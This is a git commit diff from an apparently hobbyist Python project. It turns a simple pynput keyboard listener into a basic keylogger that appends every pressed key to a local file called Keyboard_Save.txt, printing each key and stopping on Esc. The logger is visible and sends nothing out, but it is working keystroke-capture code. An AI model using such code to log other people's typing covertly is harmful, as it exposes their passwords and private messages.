e80baf209d8f55add4ba9d3a417e51f493cad5bb
peekaboo2803 <kirtanskh@gmail.com>
2024-08-29 01:13:22 -0400

    Updated some basic code and linked to a file where the keystrokes will be recorded

--- Encription_File.py
+++ Encription_File.py
@@ -1,13 +1,2 @@
 print('This is an Encription file')
 
-'''from Main import *
-
-def encription_function() :
-    for x in Input_value:
-        global to_be_encripted
-        to_be_encripted = x
-        print(x)
-
-
-        
-encription_function()'''
--- Main.py
+++ Main.py
@@ -8,15 +8,24 @@ from pynput import keyboard
     print(f"{key} pressed")
 
 keyboard_clicks'''
+#open File where the keystorkes will be recorded
+Storage = open("Keyboard_Save.txt", "a")
+
 from pynput.keyboard import Listener
 
+#Fucntion with application of recording keystokes
 def on_press(key):
+    Storage.write(f'{key}')
     print(f'{key} pressed')
-
-def on_release(key):
-    print(f'{key} released')
     if key == keyboard.Key.esc:
-        return False  # Stop listener
+        return False  
+        # Stop listener
 
-with Listener(on_press=on_press, on_release=on_release) as listener:
+'''def on_release(key):
+    print(f'{key} released')'''
+
+
+with Listener(on_press=on_press) as listener:
     listener.join()
+
+Storage.close() #Closing file
